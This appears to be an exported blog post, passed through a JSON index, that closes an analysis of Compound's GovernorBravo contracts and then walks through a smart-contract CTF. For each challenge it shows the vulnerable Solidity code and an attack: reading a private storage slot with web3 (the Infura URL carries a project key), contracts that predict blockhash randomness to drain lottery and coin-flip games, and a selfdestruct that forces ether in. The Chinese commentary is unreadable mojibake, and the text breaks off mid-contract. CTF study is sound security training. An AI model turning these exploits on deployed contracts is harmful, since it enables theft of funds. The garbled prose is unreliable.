oldVotingPeriod = votingPeriod;\n        votingPeriod = newVotingPeriod;\n\n        emit VotingPeriodSet(oldVotingPeriod, votingPeriod);\n    &#125;\n\n    /*\n     * @notice Admin function for setting the proposal threshold\n     * @dev newProposalThreshold must be greater than the hardcoded min\n     * @param newProposalThreshold new proposal threshold\n     */\n    function _setProposalThreshold(uint newProposalThereshold) external &#123;\n        require(msg.sender == admin, \"GovernorBravo::_setProposalThreshold: admin only\");\n        require(newProposalThereshold >= MIN_PROPOSAL_THRESHOLD, \"GovernorBravo::_setProposalThreshold: new threshold below min\");\n        uint oldProposalThreshold = proposalThreshold;\n        proposalThreshold = newProposalThereshold;\n\n        emit ProposalThresholdSet(oldProposalThreshold, proposalThreshold);\n    &#125;\n\n    /**\n      * @notice Initiate the GovernorBravo contract\n      * @dev Admin only. Sets initial proposal id which initiates the contract, ensuring a continious proposal id count\n      * @param governorAlpha The address for the Governor to continue the proposal id count from\n      */\n    function _initiate(address governorAlpha) external &#123;\n        require(msg.sender == admin, \"GovernorBravo::_initiate: admin only\");\n        require(initialProposalId == 0, \"GovernorBravo::_initiate: can only initiate once\");\n        proposalCount = GovernorAlpha(governorAlpha).proposalCount();\n        initialProposalId = proposalCount;\n        timelock.acceptAdmin();\n    &#125;\n\n    /**\n      * @notice Begins transfer of admin rights. The newPendingAdmin must call `_acceptAdmin` to finalize the transfer.\n      * @dev Admin function to begin change of admin. The newPendingAdmin must call `_acceptAdmin` to finalize the transfer.\n      * @param newPendingAdmin New pending admin.\n      */\n    function _setPendingAdmin(address newPendingAdmin) external &#123;\n        // Check caller = admin\n        require(msg.sender == admin, \"GovernorBravoDelegator:_setPendingAdmin: admin only\");\n\n        // Save current value, if any, for inclusion in log\n        address oldPendingAdmin = pendingAdmin;\n\n        // Store pendingAdmin with value newPendingAdmin\n        pendingAdmin = newPendingAdmin;\n\n        // Emit NewPendingAdmin(oldPendingAdmin, newPendingAdmin)\n        emit NewPendingAdmin(oldPendingAdmin, newPendingAdmin);\n    &#125;\n\n    /**\n      * @notice Accepts transfer of admin rights. msg.sender must be pendingAdmin\n      * @dev Admin function for pending admin to accept role and update admin\n      */\n    function _acceptAdmin() external &#123;\n        // Check caller is pendingAdmin and pendingAdmin â‰  address(0)\n        require(msg.sender == pendingAdmin &amp;&amp; msg.sender != address(0), \"GovernorBravoDelegator:_acceptAdmin: admin only\");\n\n        // Save current values for inclusion in log\n        address oldAdmin = admin;\n        address oldPendingAdmin = pendingAdmin;\n\n        // Store admin with value pendingAdmin\n        admin = pendingAdmin;\n\n        // Clear the pending value\n        pendingAdmin = address(0);\n\n        emit NewAdmin(oldAdmin, admin);\n        emit NewPendingAdmin(oldPendingAdmin, pendingAdmin);\n    &#125;\n\n    function add256(uint256 a, uint256 b) internal pure returns (uint) &#123;\n        uint c = a + b;\n        require(c >= a, \"addition overflow\");\n        return c;\n    &#125;\n\n    function sub256(uint256 a, uint256 b) internal pure returns (uint) &#123;\n        require(b &lt;= a, \"subtraction underflow\");\n        return a - b;\n    &#125;\n\n    function getChainId() internal pure returns (uint) &#123;\n        uint chainId;\n        assembly &#123; chainId := chainid() &#125;\n        return chainId;\n    &#125;\n&#125;\n\n\n\nAnalyzeå¯¹åº”çš„vote tokenä¸ºDFH\nå’ŒGovernance Alphaå¤§ä½“ç›¸åŒï¼Œä½†æ˜¯æœ‰æ‰€åŒºåˆ«ï¼Œåœ¨è¯¥åˆçº¦ä¸­VotingDelayï¼ŒVotingPeriodå’ŒProposalThresholdå˜é‡å¯ä»¥ä¿®æ”¹è€Œä¸æ˜¯åˆçº¦å»ºç«‹åŽå°±ä¸å¯å˜\nææ¡ˆæ¡ä»¶åˆ¤æ–­ä¹Ÿä»Žç¥¨æ•°å¤§äºŽææ¡ˆé—¨æ§›å˜æˆç¥¨æ•°å¤§äºŽææ¡ˆé—¨æ§›æˆ–ææ¡ˆè€…æ˜¯ç™½åå•è´¦æˆ·ï¼Œå¹¶ä¸”è¦æ±‚äº†åˆå§‹ææ¡ˆæ•°ç›®ä¸ä¸º0ï¼Œæ­¤å¤„çš„åˆå§‹ææ¡ˆæ•°é‡æ¥è‡ªGovernance Alphaï¼Œå…¶ä½™æ¡ä»¶ç›¸åŒ\næŠ•ç¥¨æ—¶å°†boolåž‹çš„supportæ”¹ä¸ºäº†uint8ç±»åž‹ï¼Œåªæœ‰0ï¼Œ1ï¼Œ2å€¼ä¸ºæœ‰æ•ˆå€¼ï¼Œç›¸å½“äºŽåœ¨æ”¯æŒä¸Žå¦çš„æƒ…å†µä¸‹æ–°å¢žäº†å¼ƒæƒç¥¨ï¼ŒåŒæ—¶åœ¨æŠ•ç¥¨å‡ºåšå‡ºçš„æ”¹å˜è¿˜æœ‰castVoteWithReasonï¼Œå…è®¸æŠ•ç¥¨è€…ä»¥ä¸€å®šçš„ç†ç”±è¿›è¡ŒæŠ•ç¥¨.ç¥¨æ•°ä»¥ææ¡ˆæŠ•ç¥¨å¼€å§‹æ—¶å¯¹åº”å—çš„ç¥¨æ•°ã€‚\né‡‡ç”¨äº†proxyçš„æ–¹å¼ï¼Œä¾¿äºŽåˆçº¦çš„æ›´æ–°\ncontract GovernorBravoDelegator is GovernorBravoDelegatorStorage, GovernorBravoEvents &#123;\n\tconstructor(\n\t\t\taddress timelock_,\n\t\t\taddress uni_,\n\t\t\taddress admin_,\n\t        address implementation_,\n\t        uint votingPeriod_,\n\t        uint votingDelay_,\n            uint proposalThreshold_) public &#123;\n\n        // Admin set to msg.sender for initialization\n        admin = msg.sender;\n\n        delegateTo(implementation_, abi.encodeWithSignature(\"initialize(address,address,uint256,uint256,uint256)\",\n                                                            timelock_,\n                                                            uni_,\n                                                            votingPeriod_,\n                                                            votingDelay_,\n                                                            proposalThreshold_));\n\n        _setImplementation(implementation_);\n\n\t\tadmin = admin_;\n\t&#125;\n\n\n\t/**\n     * @notice Called by the admin to update the implementation of the delegator\n     * @param implementation_ The address of the new implementation for delegation\n     */\n    function _setImplementation(address implementation_) public &#123;\n        require(msg.sender == admin, \"GovernorBravoDelegator::_setImplementation: admin only\");\n        require(implementation_ != address(0), \"GovernorBravoDelegator::_setImplementation: invalid implementation address\");\n\n        address oldImplementation = implementation;\n        implementation = implementation_;\n\n        emit NewImplementation(oldImplementation, implementation);\n    &#125;\n\n    /**\n     * @notice Internal method to delegate execution to another contract\n     * @dev It returns to the external caller whatever the implementation returns or forwards reverts\n     * @param callee The contract to delegatecall\n     * @param data The raw data to delegatecall\n     */\n    function delegateTo(address callee, bytes memory data) internal &#123;\n        (bool success, bytes memory returnData) = callee.delegatecall(data);\n        assembly &#123;\n            if eq(success, 0) &#123;\n                revert(add(returnData, 0x20), returndatasize)\n            &#125;\n        &#125;\n    &#125;\n\n\t/**\n     * @dev Delegates execution to an implementation contract.\n     * It returns to the external caller whatever the implementation returns\n     * or forwards reverts.\n     */\n    function () external payable &#123;\n        // delegate all other functions to current implementation\n        (bool success, ) = implementation.delegatecall(msg.data);\n\n        assembly &#123;\n              let free_mem_ptr := mload(0x40)\n              returndatacopy(free_mem_ptr, 0, returndatasize)\n\n              switch success\n              case 0 &#123; revert(free_mem_ptr, returndatasize) &#125;\n              default &#123; return(free_mem_ptr, returndatasize) &#125;\n        &#125;\n    &#125;\n&#125;\n\nä¸»ä½“é€»è¾‘æ˜¯ç›¸åŒçš„ï¼Œä»£ç å°±ä¸å†åˆ†æžäº†\nsummarycompoundå®žçŽ°äº†å¯¹defié¡¹ç›®çš„æ²»ç†ï¼Œé‡‡ç”¨æŠ•ç¥¨çš„æ–¹å¼è¿›è¡Œå…¬å¹³å†³ç­–ï¼ŒæŒæœ‰vote tokenå³å¯å‚ä¸ŽæŠ•ç¥¨ï¼ŒæŠ•ç¥¨ç»“æŸåŽåˆ¤æ–­æˆåŠŸä¸Žå¦æ‰§è¡Œå¯¹åº”çš„æ“ä½œè¿›è€Œå…¬å¹³å…¬æ­£çš„å®žçŽ°äº†defiçš„æ²»ç†\nå…¶ä¸­Governor Alphaå’ŒGovernor Bravoæœ‰æ‰€åŒºåˆ«ï¼Œåœ¨æ­¤ç®€å•çš„å¯¹æ¯”æ€»ç»“ä¸€ä¸‹\n\n\n\n\n\nexample\n\n\n\nå‚æ•°ä¸å¯æ›´æ–°\nå‚æ•°å¯æ›´æ–°\nVotingDelayï¼ŒVotingPeriodï¼ŒProposalThresholdç­‰å˜é‡\n\n\nä»…å­˜åœ¨yesï¼Œno é€‰æ‹©\né™¤yesï¼Œnoå¤–æ–°å¢žäº†abstain\nx\n\n\næŠ•ç¥¨æ—¶ä¸èƒ½æºå¸¦ç†ç”±æˆ–è¯„è®º\næŠ•ç¥¨æ—¶å¯ä»¥æºå¸¦ç†ç”±æˆ–è¯„è®º\næŠ•ç¥¨å‡½æ•°å¢žåŠ äº†stringç±»åž‹çš„reasonå˜é‡\n\n\næ¯æ¬¡æ›´æ–°éœ€è¦é‡ç½®ææ¡ˆç¼–å·\nç»´æŠ¤å›ºå®šä¸”è¿žç»­çš„ææ¡ˆç¼–å·\nx\n\n\n","slug":"Compound","date":"2022-08-01T10:42:57.893Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"2dde006a1ba2b506fb11671b03da33e3","title":"Smart Contract ctf","content":"é¢˜åº“åœ°å€ï¼šhttps://blockchain-ctf.securityinnovation.com/#/\n\n\n1.DonationCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract Donation is CtfFramework&#123;\n\n    using SafeMath for uint256;\n\n    uint256 public funds;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        funds = funds.add(msg.value);\n    &#125;\n    \n    function() external payable ctf&#123;\n        funds = funds.add(msg.value);\n    &#125;\n\n    function withdrawDonationsFromTheSuckersWhoFellForIt() external ctf&#123;\n        msg.sender.transfer(funds);\n        funds = 0;\n    &#125;\n\n&#125;\n\nAnalyzeè¿™ä¸€å…³æ²¡ä»€ä¹ˆéš¾åº¦ï¼Œç›´æŽ¥è°ƒç”¨withdrawDonationsFromTheSuckersWhoFellForIt()å°±å¯ä»¥äº†\nAttackå¤åˆ¶åˆçº¦ä»¥åŠåˆçº¦åœ°å€ï¼Œåœ¨remixä¸­ataddresså¹¶è¿›è¡Œè°ƒç”¨å³å¯\n2.Lock BoxCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract Lockbox1 is CtfFramework&#123;\n\n    uint256 private pin;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        pin = now%10000;\n    &#125;\n    \n    function unlock(uint256 _pin) external ctf&#123;\n        require(pin == _pin, \"Incorrect PIN\");\n        msg.sender.transfer(address(this).balance);\n    &#125;\n\n&#125;\n\nAnalyzeè¿™é“é¢˜è€ƒéªŒäº†æ™ºèƒ½åˆçº¦çš„å˜é‡å­˜å‚¨æœºåˆ¶ï¼Œæƒ³è¦å®Œæˆè¯¥é¢˜éœ€è¦çŸ¥é“pinï¼Œè€Œpinæ˜¯privateå­˜å‚¨æ–¹å¼ï¼Œå¯ä»¥ä½¿ç”¨web3è„šæœ¬è¿›è¡ŒèŽ·å¾—ï¼Œpinå­˜å‚¨åœ¨slot0ï¼Œç›´æŽ¥èŽ·å¾—å³å¯ã€‚\nAttackfrom web3 import Web3,HTTPProvider\nw3=Web3(HTTPProvider('https://ropsten.infura.io/v3/071f682145af4cfc9f0b92a497e89431'))\nbaddress='0xb7f93403a2215240f29e7e502dcc497cf3d893a0'\naddress=Web3.toChecksumAddress(baddress)\nprint(w3.eth.getStorageAt(address,0))\n\nåœ¨è¿›è¡Œè°ƒç”¨å³å¯\n3.Piggy BankCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract PiggyBank is CtfFramework&#123;\n\n    using SafeMath for uint256;\n\n    uint256 public piggyBalance;\n    string public name;\n    address public owner;\n    \n    constructor(address _ctfLauncher, address _player, string _name) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        name=_name;\n        owner=msg.sender;\n        piggyBalance=piggyBalance.add(msg.value);\n    &#125;\n    \n    function() external payable ctf&#123;\n        piggyBalance=piggyBalance.add(msg.value);\n    &#125;\n\n    \n    modifier onlyOwner()&#123;\n        require(msg.sender == owner, \"Unauthorized: Not Owner\");\n        _;\n    &#125;\n\n    function withdraw(uint256 amount) internal&#123;\n        piggyBalance = piggyBalance.sub(amount);\n        msg.sender.transfer(amount);\n    &#125;\n\n    function collectFunds(uint256 amount) public onlyOwner ctf&#123;\n        require(amount&lt;=piggyBalance, \"Insufficient Funds in Contract\");\n        withdraw(amount);\n    &#125;\n    \n&#125;\n\n\ncontract CharliesPiggyBank is PiggyBank&#123;\n    \n    uint256 public withdrawlCount;\n    \n    constructor(address _ctfLauncher, address _player) public payable\n        PiggyBank(_ctfLauncher, _player, \"Charlie\") \n    &#123;\n        withdrawlCount = 0;\n    &#125;\n    \n    function collectFunds(uint256 amount) public ctf&#123;\n        require(amount&lt;=piggyBalance, \"Insufficient Funds in Contract\");\n        withdrawlCount = withdrawlCount.add(1);\n        withdraw(amount);\n    &#125;\n    \n&#125;\n\nAnalyzePiggyBanké‡Œçš„withdrawæ ‡äº†internalï¼Œåªèƒ½åœ¨å†…éƒ¨è°ƒç”¨ã€‚collectFundsåˆæœ‰onlyOwnerï¼ŒåŸºæœ¬å®‰å…¨ã€‚\nä½†CharliesPiggyBankåœ¨ç»§æ‰¿æ—¶ä¸ºäº†åˆ¶é€ æ¼æ´žå¼ºè¡Œé‡å†™äº†collectFundsï¼ŒåŽ»æŽ‰äº†msg.senderçš„é™åˆ¶ã€‚\nAttackè®¡ç®—æ•°å€¼ç›´æŽ¥è°ƒç”¨å³å¯\n4.SI Token SaleCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\n// https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.8.0/contracts/token/ERC20/StandardToken.sol\nimport \"../StandardToken.sol\";\n\ncontract SIToken is StandardToken &#123;\n\n    using SafeMath for uint256;\n\n    string public name = \"SIToken\";\n    string public symbol = \"SIT\";\n    uint public decimals = 18;\n    uint public INITIAL_SUPPLY = 1000 * (10 ** decimals);\n\n    constructor() public&#123;\n        totalSupply_ = INITIAL_SUPPLY;\n        balances[this] = INITIAL_SUPPLY;\n    &#125;\n&#125;\n\ncontract SITokenSale is SIToken, CtfFramework &#123;\n\n    uint256 public feeAmount;\n    uint256 public etherCollection;\n    address public developer;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        feeAmount = 10 szabo; \n        developer = msg.sender;\n        purchaseTokens(msg.value);\n    &#125;\n\n    function purchaseTokens(uint256 _value) internal&#123;\n        require(_value > 0, \"Cannot Purchase Zero Tokens\");\n        require(_value &lt; balances[this], \"Not Enough Tokens Available\");\n        balances[msg.sender] += _value - feeAmount;\n        balances[this] -= _value;\n        balances[developer] += feeAmount; \n        etherCollection += msg.value;\n    &#125;\n\n    function () payable external ctf&#123;\n        purchaseTokens(msg.value);\n    &#125;\n\n    // Allow users to refund their tokens for half price ;-)\n    function refundTokens(uint256 _value) external ctf&#123;\n        require(_value>0, \"Cannot Refund Zero Tokens\");\n        transfer(this, _value);\n        etherCollection -= _value/2;\n        msg.sender.transfer(_value/2);\n    &#125;\n\n    function withdrawEther() external ctf&#123;\n        require(msg.sender == developer, \"Unauthorized: Not Developer\");\n        require(balances[this] == 0, \"Only Allowed Once Sale is Complete\");\n        msg.sender.transfer(etherCollection);\n    &#125;\n\n&#125;\n\nAnalyzeé¢˜ç›®æ¼æ´žæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯ä¸€æ­¥æ•´æ•°æº¢å‡ºæ¼æ´ž \nAttackbalances[msg.sender] +&#x3D; _value â€“ feeAmountï¼Œå½“valueè¶³å¤Ÿå°æ—¶ï¼Œbalances[msg.sender]æº¢å‡ºä¸ºå¤§æ•´æ•°ã€‚æŸ¥çœ‹etherCollectionï¼Œå¹¶è®¡ç®—äºŒå€å€¼è°ƒç”¨refundTokens()å³å¯\n5.Secure BankCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract SimpleBank is CtfFramework&#123;\n\n    mapping(address => uint256) public balances;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        balances[msg.sender] = msg.value;\n    &#125;\n\n    function deposit(address _user) public payable ctf&#123;\n        balances[_user] += msg.value;\n    &#125;\n\n    function withdraw(address _user, uint256 _value) public ctf&#123;\n        require(_value&lt;=balances[_user], \"Insufficient Balance\");\n        balances[_user] -= _value;\n        msg.sender.transfer(_value);\n    &#125;\n\n    function () public payable ctf&#123;\n        deposit(msg.sender);\n    &#125;\n\n&#125;\n\ncontract MembersBank is SimpleBank&#123;\n\n    mapping(address => string) public members;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        SimpleBank(_ctfLauncher, _player)\n    &#123;\n    &#125;\n\n    function register(address _user, string _username) public ctf&#123;\n        members[_user] = _username;\n    &#125;\n\n    modifier isMember(address _user)&#123;\n        bytes memory username = bytes(members[_user]);\n        require(username.length != 0, \"Member Must First Register\");\n        _;\n    &#125;\n\n    function deposit(address _user) public payable isMember(_user) ctf&#123;\n        super.deposit(_user);\n    &#125;\n\n    function withdraw(address _user, uint256 _value) public isMember(_user) ctf&#123;\n        super.withdraw(_user, _value);\n    &#125;\n\n&#125;\n\ncontract SecureBank is MembersBank&#123;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        MembersBank(_ctfLauncher, _player)\n    &#123;\n    &#125;\n\n    function deposit(address _user) public payable ctf&#123;\n        require(msg.sender == _user, \"Unauthorized User\");\n        require(msg.value &lt; 100 ether, \"Exceeding Account Limits\");\n        require(msg.value >= 1 ether, \"Does Not Satisfy Minimum Requirement\");\n        super.deposit(_user);\n    &#125;\n\n    function withdraw(address _user, uint8 _value) public ctf&#123;\n        require(msg.sender == _user, \"Unauthorized User\");\n        require(_value &lt; 100, \"Exceeding Account Limits\");\n        require(_value >= 1, \"Does Not Satisfy Minimum Requirement\");\n        super.withdraw(_user, _value * 1 ether);\n    &#125;\n\n    function register(address _user, string _username) public ctf&#123;\n        require(bytes(_username).length!=0, \"Username Not Enough Characters\");\n        require(bytes(_username).length&lt;=20, \"Username Too Many Characters\");\n        super.register(_user, _username);\n    &#125;\n&#125;\n\nAnalyzeå‡½æ•°é‡å†™é‡è½½é—®é¢˜ï¼Œ å­˜åœ¨function withdraw(address _user, uint256 _value) public isMember(_user) ctfå’Œ  function withdraw(address _user, uint8 _value) public ctfä¸¤ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯uint256å¹¶ä¸”æ²¡æœ‰é™åˆ¶msg.sender &#x3D;&#x3D; _user\nAttackåœ¨åŒºå—é“¾æµè§ˆå™¨ä¸­æ‰¾åˆ°æœ‰é’±çš„userè¿›è¡Œregisterä¹‹åŽè°ƒç”¨withdrawå³å¯\n6.LotteryCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract Lottery is CtfFramework&#123;\n\n    using SafeMath for uint256;\n\n    uint256 public totalPot;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        totalPot = totalPot.add(msg.value);\n    &#125;\n    \n    function() external payable ctf&#123;\n        totalPot = totalPot.add(msg.value);\n    &#125;\n\n    function play(uint256 _seed) external payable ctf&#123;\n        require(msg.value >= 1 finney, \"Insufficient Transaction Value\");\n        totalPot = totalPot.add(msg.value);\n        bytes32 entropy = blockhash(block.number);\n        bytes32 entropy2 = keccak256(abi.encodePacked(msg.sender));\n        bytes32 target = keccak256(abi.encodePacked(entropy^entropy2));\n        bytes32 guess = keccak256(abi.encodePacked(_seed));\n        if(guess==target)&#123;\n            //winner\n            uint256 payout = totalPot;\n            totalPot = 0;\n            msg.sender.transfer(payout);\n        &#125;\n    &#125;    \n\n\n&#125;\n\nAnalyzeéšæœºæ•°é—®é¢˜ã€‚è¿™ç§å››uiæŠ€æœ¯åªè¦åœ¨åŒä¸€ç¬”äº¤æ˜“ä¸­block.numbeæ˜¯ç›¸åŒçš„ï¼Œåœ¨ä¸€ä¸ªå‡½æ•°ä¸­è¿›è¡Œæ”»å‡»å³å¯\nAttackinterface ctf&#123;\n    function ctf_challenge_add_authorized_sender(address _addr) external;\n&#125;\ncontract attack&#123;\n    Lottery target=Lottery(0x4b6238A6fb8F061b51DA65BC353F448b9B4bF628);\n    constructor() public&#123;&#125;\n    function pwn()public payable&#123;\n        bytes32 entropy = blockhash(block.number);\n        bytes32 entropy2 = keccak256(abi.encodePacked(this));\n        uint seed = uint(entropy^entropy2);\n        target.play.value(1 finney)(seed);\n    &#125;\n    receive() external payable&#123;&#125;\n    function kill(address payable addr)public payable&#123;\n        selfdestruct(addr);\n    &#125;\n&#125;\n\n\n7.Heads or TailsCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract HeadsOrTails is CtfFramework&#123;\n\n    using SafeMath for uint256;\n\n    uint256 public gameFunds;\n    uint256 public cost;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        gameFunds = gameFunds.add(msg.value);\n        cost = gameFunds.div(10);\n    &#125;\n    \n    function play(bool _heads) external payable ctf&#123;\n        require(msg.value == cost, \"Incorrect Transaction Value\");\n        require(gameFunds >= cost.div(2), \"Insufficient Funds in Game Contract\");\n        bytes32 entropy = blockhash(block.number-1);\n        bytes1 coinFlip = entropy[0] &amp; 1;\n        if ((coinFlip == 1 &amp;&amp; _heads) || (coinFlip == 0 &amp;&amp; !_heads)) &#123;\n            //win\n            gameFunds = gameFunds.sub(msg.value.div(2));\n            msg.sender.transfer(msg.value.mul(3).div(2));\n        &#125;\n        else &#123;\n            //loser\n            gameFunds = gameFunds.add(msg.value);\n        &#125;\n    &#125;\n\n&#125;\n\nAnalyzeèµŒåšæ¸¸æˆï¼ŒèŽ·èƒœå³å¯å¤šå¾—ç™¾åˆ†ä¹‹äº”ï¼Œè¿žç»­æ­£ç¡®20æ¬¡å³å¯ï¼Œå’Œä¸Šä¸€é¢˜å¤§åŒå°å¼‚ä¸»è¦æ˜¯å¢žåŠ äº†if ((coinFlip &#x3D;&#x3D; 1 &amp;&amp; _heads) || (coinFlip &#x3D;&#x3D; 0 &amp;&amp; !_heads))åˆ¤æ–­æ¡ä»¶ï¼Œä½†æ˜¯_headså¯æŽ§\nAttackpragma solidity 0.4.24;\ninterface Heads&#123;\n    function play(bool _heads) external payable;\n    function ctf_challenge_add_authorized_sender(address _addr) external;\n&#125;\ncontract attack&#123;\n    HeadsOrTails target=HeadsOrTails(0xc7745A854ac557458681240072466aDC54Fa5C17);\n    bool public key;\n    function pwn() public payable&#123;\n        bytes32 entropy = blockhash(block.number-1);\n        bytes1 coinFlip = entropy[0] &amp; 1;\n        if(coinFlip==0)\n        key=false;\n        if(coinFlip==1)\n        key=true;\n        for(uint i=1;i&lt;=20;i++)\n        &#123;target.play.value(0.1 ether)(key);&#125;\n    &#125;\n    function() external payable&#123;&#125;\n    function ret(address addr)public payable&#123;\n        msg.sender.transfer(this.balance);\n    &#125;\n&#125;\n\n8.Record LabelCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\n\ncontract Royalties&#123;\n\n    using SafeMath for uint256;\n\n    address private collectionsContract;\n    address private artist;\n\n    address[] private receiver;\n    mapping(address => uint256) private receiverToPercentOfProfit;\n    uint256 private percentRemaining;\n\n    uint256 public amountPaid;\n\n    constructor(address _manager, address _artist) public\n    &#123;\n        collectionsContract = msg.sender;\n        artist=_artist;\n\n        receiver.push(_manager);\n        receiverToPercentOfProfit[_manager] = 80;\n        percentRemaining = 100 - receiverToPercentOfProfit[_manager];\n    &#125;\n\n    modifier isCollectionsContract() &#123; \n        require(msg.sender == collectionsContract, \"Unauthorized: Not Collections Contract\");\n        _;\n    &#125;\n\n    modifier isArtist()&#123;\n        require(msg.sender == artist, \"Unauthorized: Not Artist\");\n        _;\n    &#125;\n\n    function addRoyaltyReceiver(address _receiver, uint256 _percent) external isArtist&#123;\n        require(_percent&lt;percentRemaining, \"Precent Requested Must Be Less Than Percent Remaining\");\n        receiver.push(_receiver);\n        receiverToPercentOfProfit[_receiver] = _percent;\n        percentRemaining = percentRemaining.sub(_percent);\n    &#125;\n\n    function payoutRoyalties() public payable isCollectionsContract&#123;\n        for (uint256 i = 0; i&lt; receiver.length; i++)&#123;\n            address current = receiver[i];\n            uint256 payout = msg.value.mul(receiverToPercentOfProfit[current]).div(100);\n            amountPaid = amountPaid.add(payout);\n            current.transfer(payout);\n        &#125;\n        msg.sender.call.value(msg.value-amountPaid)(bytes4(keccak256(\"collectRemainingFunds()\")));\n    &#125;\n\n    function getLastPayoutAmountAndReset() external isCollectionsContract returns(uint256)&#123;\n        uint256 ret = amountPaid;\n        amountPaid = 0;\n        return ret;\n    &#125;\n\n    function () public payable isCollectionsContract&#123;\n        payoutRoyalties();\n    &#125;\n&#125;\n\ncontract Manager&#123;\n    address public owner;\n\n    constructor(address _owner) public &#123;\n        owner = _owner;\n    &#125;\n\n    function withdraw(uint256 _balance) public &#123;\n        owner.transfer(_balance);\n    &#125;\n\n    function () public payable&#123;\n        // empty\n    &#125;\n&#125;\n\ncontract RecordLabel is CtfFramework&#123;\n\n    using SafeMath for uint256;\n\n    uint256 public funds;\n    address public royalties;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        royalties = new Royalties(new Manager(_ctfLauncher), _player);\n        funds = funds.add(msg.value);\n    &#125;\n    \n    function() external payable ctf&#123;\n        funds = funds.add(msg.value);\n    &#125;\n\n\n    function withdrawFundsAndPayRoyalties(uint256 _withdrawAmount) external ctf&#123;\n        require(_withdrawAmount&lt;=funds, \"Insufficient Funds in Contract\");\n        funds = funds.sub(_withdrawAmount);\n        royalties.call.value(_withdrawAmount)();\n        uint256 royaltiesPaid = Royalties(royalties).getLastPayoutAmountAndReset();\n        uint256 artistPayout = _withdrawAmount.sub(royaltiesPaid); \n        msg.sender.transfer(artistPayout);\n    &#125;\n\n    function collectRemainingFunds() external payable&#123;\n        require(msg.sender == royalties, \"Unauthorized: Not Royalties Contract\");\n    &#125;\n\n&#125;\n\nAnalyzeæ•´ä½“æ¥è¯´å°±æ˜¯å–æ¬¾çš„æ—¶å€™è¦æŒ‰ç™¾åˆ†æ¯”åˆ†ä¸€éƒ¨åˆ†ç»™ Manager åˆçº¦\nAttackç›´æŽ¥è¿›è¡Œè°ƒç”¨ withdrawFundsAndPayRoyaltieså‡½æ•°ï¼Œé€€æ¬¾é‡‘é¢ä¸º1etherï¼Œä¼šæœ‰80ï¼…è¿›å…¥Manager åˆçº¦ï¼Œ20%å›žåˆ°è‡ªå·±è¿™é‡Œï¼Œæ­¤æ—¶é¢˜ç›®åˆçº¦ä½™é¢ä¸º0ï¼Œé€šå…³\n9.Slot MachineCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract SlotMachine is CtfFramework&#123;\n\n    using SafeMath for uint256;\n\n    uint256 public winner;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        winner = 5 ether;\n    &#125;\n    \n    function() external payable ctf&#123;\n        require(msg.value == 1 szabo, \"Incorrect Transaction Value\");\n        if (address(this).balance >= winner)&#123;\n            msg.sender.transfer(address(this).balance);\n        &#125;\n    &#125;\n\n&#125;\n\nAnalyze1szaboç­‰äºŽ0.000001etherï¼Œè¿›è¡Œ(5-1.5)&#x2F;0.000001æ¬¡è½¬è´¦æ˜¾ç„¶ä¸çŽ°å®žï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è‡ªä¼šåˆçº¦è½¬å…¥(5-1.5)-0.000001etherï¼Œåœ¨æž„å»ºæ”»å‡»åˆçº¦è½¬å…¥1szaboå³å¯ã€‚\nAttackpragma solidity ^0.5.0;\n\n\ncontract des&#123;\n    constructor()public payable&#123;\n        require(msg.value==3.499999 ether);\n    &#125;\n    function kill(address payable target)public payable&#123;\n        selfdestruct(target);\n    &#125;\n&#125;\ncontract fina&#123;\n    constructor()public payable&#123;\n        require(msg.value==1 szabo);\n    &#125;\n    function trans(address payable target)public payable&#123;\n        target.transfer(address(this).balance);\n    &#125;\n    function kill()public payable&#123;\n        selfdestruct(tx.origin);\n    &#125;\n&#125;\n\n10.Trust FundCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract TrustFund is CtfFramework&#123;\n\n    using SafeMath for uint256;\n\n    uint256 public allowancePerYear;\n    uint256 public startDate;\n    uint256 public numberOfWithdrawls;\n    bool public withdrewThisYear;\n    address public custodian;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        custodian = msg.sender;\n        allowancePerYear = msg.value.div(10);        \n        startDate = now;\n    